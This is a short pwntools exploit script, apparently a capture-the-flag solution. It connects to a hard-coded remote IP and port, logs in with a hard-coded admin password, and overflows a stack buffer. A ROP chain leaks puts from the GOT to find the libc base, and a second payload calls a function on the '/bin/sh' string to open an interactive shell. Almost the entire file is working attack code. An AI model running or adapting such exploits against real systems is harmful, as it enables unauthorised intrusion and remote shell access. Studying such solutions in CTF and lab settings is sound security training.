#coding:utf-8

from pwn import *

context.log_level = "debug"

local = 0
if local:
    p = remote("172.17.0.2", 1234)

    raw_input("go")
else:
    p = remote("47.104.16.75", 9000)
    puts =  0x000000000006fd60
    binsh = 1574211

offset = 0x50 + 8
pop_rdi_ret = 0x0000000000400b03
puts_plt = 0x000000000400620

p.recvuntil("username: ")
p.sendline("admin")
p.recvuntil("password: ")
p.sendline("T6OBSh2i")
p.recvuntil("Your choice: ")
                                                                                                   # puts.got           puts.plt
payload = '3'+'a'*(0x50-0xc-1) + p8(12) + '\x00'*(0xc-1) + p64(0xffffffff) + p64(pop_rdi_ret) + p64(0x000000000601018) + p64(puts_plt) + p64(0x0000000004008BF)
p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8, "\x00"))
libc_base = puts_addr - puts
binsh_addr = libc_base + binsh

info("puts_addr : {}".format(hex(puts_addr)))

p.recvuntil("Your choice: ")
payload = '3'+'a'*(0x50-0xc-1) + p8(12) + '\x00'*(0xc-1) + p64(0xffffffff) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(0x000000000400630)
p.sendline(payload)

p.interactive()

